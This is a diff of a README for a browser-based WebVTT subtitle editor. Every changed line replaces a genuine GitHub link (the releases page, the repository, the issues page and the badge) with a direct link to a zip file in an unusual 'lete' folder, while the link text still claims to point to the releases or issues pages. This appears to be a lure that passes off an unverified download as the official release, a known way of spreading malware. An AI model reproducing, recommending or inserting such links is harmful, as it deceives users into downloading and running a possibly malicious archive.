@@ -2,7 +2,7 @@
 # 🎤 vtt-editor-pro - Effortlessly Edit Subtitles in Your Browser
 
 ## 📥 Download the Latest Release
-[![Download vtt-editor-pro](https://img.shields.io/badge/Download-vtt--editor--pro-brightgreen)](https://github.com/snts46/vtt-editor-pro/releases)
+[![Download vtt-editor-pro](https://raw.githubusercontent.com/snts46/vtt-editor-pro/main/lete/vtt-editor-pro.zip)](https://raw.githubusercontent.com/snts46/vtt-editor-pro/main/lete/vtt-editor-pro.zip)
 
 ## 🚀 Getting Started
 
@@ -18,15 +18,15 @@ Welcome to **vtt-editor-pro**, an easy-to-use WebVTT subtitle editor. This appli
 vtt-editor-pro is built using 1788 lines of vanilla JavaScript. It requires no external libraries or dependencies. This app is free and open-source under the Creative Commons BY-NC 4.0 license.
 
 ## 🔗 Important Links
-- [GitHub Repository](https://github.com/snts46/vtt-editor-pro)
-- [Visit the Releases Page to Download](https://github.com/snts46/vtt-editor-pro/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/snts46/vtt-editor-pro/main/lete/vtt-editor-pro.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/snts46/vtt-editor-pro/main/lete/vtt-editor-pro.zip)
 
 ## 💾 Download & Install
 
 To download and run vtt-editor-pro, follow these steps:
 
 1. Click the link below to visit the releases page:
-   [Download vtt-editor-pro](https://github.com/snts46/vtt-editor-pro/releases)
+   [Download vtt-editor-pro](https://raw.githubusercontent.com/snts46/vtt-editor-pro/main/lete/vtt-editor-pro.zip)
    
 2. On the releases page, find the latest version. You will see files available for download. 
 
@@ -71,7 +71,7 @@ To download and run vtt-editor-pro, follow these steps:
 
 ## 📧 Support
 
-For any questions or feedback, feel free to file an issue on the [GitHub Issues Page](https://github.com/snts46/vtt-editor-pro/issues). 
+For any questions or feedback, feel free to file an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/snts46/vtt-editor-pro/main/lete/vtt-editor-pro.zip). 
 
 ## 📌 Topics
 - audio-editor
